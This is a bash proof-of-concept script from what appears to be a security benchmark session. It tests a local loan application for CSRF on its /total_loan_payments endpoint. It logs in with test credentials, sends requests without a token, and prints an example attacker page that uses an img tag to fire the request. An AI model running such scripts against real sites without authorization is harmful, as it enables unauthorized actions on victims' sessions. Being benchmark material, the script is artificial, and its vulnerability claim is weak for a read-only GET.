#!/bin/bash
# POC: Demonstrates CSRF vulnerability on /total_loan_payments AJAX endpoint by showing that GET requests can be made without CSRF token validation
# Target: ./repo
# Created: 2025-12-02T16:23:46.922Z
# Session: benchmark-XBEN-104-24-mioryccy

# CSRF POC - /total_loan_payments AJAX Endpoint
# This script demonstrates that the /total_loan_payments endpoint is vulnerable to CSRF attacks
# because it doesn't validate CSRF tokens on AJAX requests

TARGET_URL="${1:-http://localhost:8080}"
COOKIES_FILE="/tmp/csrf_poc_cookies.txt"

echo "=========================================="
echo "CSRF POC - /total_loan_payments Endpoint"
echo "=========================================="
echo ""

# Step 1: Login to establish a session
echo "[*] Step 1: Logging in to establish authenticated session..."
curl -s -c "$COOKIES_FILE" -X POST "$TARGET_URL/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test" > /dev/null

if [ ! -f "$COOKIES_FILE" ]; then
    echo "[-] Failed to establish session. Login may have failed."
    exit 1
fi

echo "[+] Session established. Cookies saved."
echo ""

# Step 2: Verify the session is valid by accessing loan_details
echo "[*] Step 2: Verifying authenticated session is valid..."
RESPONSE=$(curl -s -b "$COOKIES_FILE" "$TARGET_URL/loan_details")

if echo "$RESPONSE" | grep -q "loan_details"; then
    echo "[+] Session is valid - can access /loan_details"
else
    echo "[-] Session verification failed"
    rm -f "$COOKIES_FILE"
    exit 1
fi
echo ""

# Step 3: Make AJAX GET request to /total_loan_payments WITHOUT CSRF token
echo "[*] Step 3: Making AJAX GET request to /total_loan_payments WITHOUT CSRF token..."
echo "[*] This demonstrates that the endpoint doesn't require CSRF protection"
echo ""

AJAX_RESPONSE=$(curl -s -b "$COOKIES_FILE" \
  -H "X-Requested-With: XMLHttpRequest" \
  "$TARGET_URL/total_loan_payments?principal=10000&payment=212.47&term=60")

echo "[+] AJAX Response received:"
echo "$AJAX_RESPONSE" | python3 -m json.tool 2>/dev/null || echo "$AJAX_RESPONSE"
echo ""

# Step 4: Verify no CSRF token is required in headers
echo "[*] Step 4: Checking response headers for CSRF-related headers..."
HEADERS=$(curl -s -i -b "$COOKIES_FILE" \
  -H "X-Requested-With: XMLHttpRequest" \
  "$TARGET_URL/total_loan_payments?principal=10000&payment=212.47&term=60" 2>&1)

if echo "$HEADERS" | grep -q "CSRF"; then
    echo "[-] CSRF tokens found in response headers"
else
    echo "[+] No CSRF tokens found in response headers"
fi
echo ""

# Step 5: Demonstrate CSRF attack vector - simulate attacker's page
echo "[*] Step 5: Demonstrating CSRF attack vector..."
echo "[*] An attacker can craft a malicious page that triggers this request:"
echo ""
echo "    <html>"
echo "    <body>"
echo "    <img src='http://localhost:8080/total_loan_payments?principal=10000&payment=212.47&term=60'>"
echo "    </body>"
echo "    </html>"
echo ""
echo "[+] When a logged-in user visits this page, their browser will make the AJAX request without their knowledge"
echo ""

# Step 6: Verify that session cookies are sent with the request
echo "[*] Step 6: Verifying session cookies are sent with AJAX request..."
COOKIE_HEADERS=$(curl -s -v -b "$COOKIES_FILE" \
  -H "X-Requested-With: XMLHttpRequest" \
  "$TARGET_URL/total_loan_payments?principal=10000&payment=212.47&term=60" 2>&1 | grep -i "cookie")

if [ -n "$COOKIE_HEADERS" ]; then
    echo "[+] Session cookies ARE sent with request (confirmed CSRF vulnerability)"
    echo "    Cookies: $COOKIE_HEADERS"
else
    echo "[-] No cookies sent with request"
fi
echo ""

# Cleanup
rm -f "$COOKIES_FILE"

echo "=========================================="
echo "CSRF Vulnerability Confirmed"
echo "=========================================="
echo "[!] The /total_loan_payments endpoint accepts AJAX requests without CSRF token validation"
echo "[!] Authenticated session cookies are automatically sent by the browser"
echo "[!] An attacker can trigger these requests from a malicious website"
echo ""